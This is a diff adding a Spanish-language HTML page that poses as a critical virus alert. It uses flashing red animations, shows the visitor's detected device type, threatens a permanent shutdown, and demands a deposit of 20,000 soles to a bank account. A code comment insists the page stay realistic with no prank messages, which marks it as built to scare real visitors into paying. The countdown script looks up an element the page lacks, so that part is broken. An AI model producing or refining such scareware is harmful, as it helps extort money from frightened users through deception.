@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Alerta de Virus Detectado!</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1a1a1a;
+            color: red;
+            text-align: center;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overflow: hidden;
+            animation: flashing 1s infinite;
+        }
+
+        @keyframes flashing {
+            0% { background-color: #1a1a1a; }
+            50% { background-color: #f00; }
+            100% { background-color: #1a1a1a; }
+        }
+
+        h1 {
+            font-size: 3.5em;
+            color: #ff0000;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.2; }
+            100% { opacity: 1; }
+        }
+
+        .message {
+            font-size: 2em;
+            margin-top: 20px;
+            color: #fff;
+            animation: shake 0.5s infinite;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-10px); }
+            100% { transform: translateX(0); }
+        }
+
+        .detected {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: lime;
+            animation: shake 0.5s infinite;
+        }
+
+        .error {
+            font-size: 2em;
+            color: white;
+            animation: flashing 1s infinite;
+        }
+
+        .scary-message {
+            font-size: 2em;
+            margin-top: 30px;
+            color: #ff3300;
+            font-weight: bold;
+            animation: flash-red 1s infinite;
+        }
+
+        @keyframes flash-red {
+            0% { color: #ff3300; }
+            50% { color: #fff; }
+            100% { color: #ff3300; }
+        }
+
+        .countdown {
+            font-size: 2em;
+            color: #ff0000;
+            font-weight: bold;
+            margin-top: 30px;
+        }
+
+        .payment-info {
+            font-size: 1.8em;
+            color: yellow;
+            font-weight: bold;
+            margin-top: 20px;
+            animation: blink 1s infinite;
+        }
+
+    </style>
+</head>
+<body>
+    <h1>¡ALERTA DE VIRUS DETECTADO!</h1>
+    <div class="message">Tu dispositivo está siendo atacado por un virus crítico.</div>
+    <div class="detected">Modelo del dispositivo: <span id="device-model"></span></div>
+    <div class="error">ERROR CRÍTICO: Archivos del sistema comprometidos</div>
+    
+    <div class="scary-message">
+        ¡NO APAGUES EL DISPOSITIVO! ¡REINICIO FORZADO EN 24 HORAS!
+    </div>
+
+    <div class="payment-info">
+        <p>Para evitar el apagado permanente de tu dispositivo, realiza un depósito de 20,000 soles a la cuenta: <strong>123-4567890-12</strong>.</p>
+        <p>Este pago es urgente para evitar la pérdida de todos tus archivos y el apagado definitivo.</p>
+    </div>
+
+    <script>
+        // Función para obtener el modelo del dispositivo (simulación)
+        function obtenerModeloDispositivo() {
+            const userAgent = navigator.userAgent;
+            let modelo = "Desconocido";
+            
+            // Simulación para dispositivos Android
+            if (userAgent.includes("Android")) {
+                modelo = "Dispositivo Android detectado";
+            }
+
+            return modelo;
+        }
+
+        // Asignar el modelo del dispositivo al elemento HTML
+        document.getElementById('device-model').textContent = obtenerModeloDispositivo();
+
+        // Cuenta regresiva de 24 horas (simulada)
+        let countdownValue = 24;
+        const countdownElement = document.getElementById("countdown");
+        
+        const countdownInterval = setInterval(() => {
+            countdownElement.textContent = countdownValue;
+            countdownValue--;
+            if (countdownValue < 0) {
+                clearInterval(countdownInterval);
+                // Mostrar el mensaje de "Apagado"
+                setTimeout(() => {
+                    document.querySelector('.scary-message').textContent = "¡Tu dispositivo se apagará definitivamente!";
+                }, 500);
+            }
+        }, 1000);
+
+        // No cambiar la página ni agregar mensajes de broma, mantén todo realista
+    </script>
+
+</body>
+</html>
